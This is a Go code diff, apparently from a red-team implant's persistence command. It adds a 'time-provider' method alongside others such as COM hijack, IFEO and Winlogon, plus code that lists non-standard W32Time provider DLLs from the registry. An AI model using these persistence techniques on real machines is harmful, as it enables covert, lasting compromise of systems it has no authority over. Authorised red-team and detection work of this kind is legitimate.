@@ -68,10 +68,12 @@ func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
 		return persistAccessibility(args)
 	case "active-setup":
 		return persistActiveSetup(args)
+	case "time-provider":
+		return persistTimeProvider(args)
 	case "list":
 		return listPersistence(args)
 	default:
-		return errorf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, ifeo, winlogon, print-processor, accessibility, active-setup, or list", args.Method)
+		return errorf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, ifeo, winlogon, print-processor, accessibility, active-setup, time-provider, or list", args.Method)
 	}
 }
 
@@ -411,6 +413,42 @@ func listPersistence(args persistArgs) structs.CommandResult {
 	}
 	if !asFound {
 		lines = append(lines, "  (no non-Microsoft entries detected)")
+	}
+	lines = append(lines, "")
+
+	// Check Time Providers
+	lines = append(lines, "--- Time Providers (HKLM\\...\\W32Time\\TimeProviders) ---")
+	tpKey, err := registry.OpenKey(registry.LOCAL_MACHINE, timeProviderRegBase, registry.ENUMERATE_SUB_KEYS)
+	tpFound := false
+	if err == nil {
+		tpNames, _ := tpKey.ReadSubKeyNames(-1)
+		tpKey.Close()
+		// Known legitimate providers
+		legitimate := map[string]bool{"NtpClient": true, "NtpServer": true, "VMICTimeProvider": true}
+		for _, tpName := range tpNames {
+			if legitimate[tpName] {
+				continue
+			}
+			subPath := timeProviderRegBase + `\` + tpName
+			subKey, err := registry.OpenKey(registry.LOCAL_MACHINE, subPath, registry.QUERY_VALUE)
+			if err != nil {
+				continue
+			}
+			dllName, _, err := subKey.GetStringValue("DllName")
+			enabled, _, _ := subKey.GetIntegerValue("Enabled")
+			subKey.Close()
+			if err == nil && dllName != "" {
+				status := "disabled"
+				if enabled == 1 {
+					status = "enabled"
+				}
+				lines = append(lines, fmt.Sprintf("  ⚠ %s → %s (%s)", tpName, dllName, status))
+				tpFound = true
+			}
+		}
+	}
+	if !tpFound {
+		lines = append(lines, "  (no non-standard providers detected)")
 	}
 	lines = append(lines, "")
 
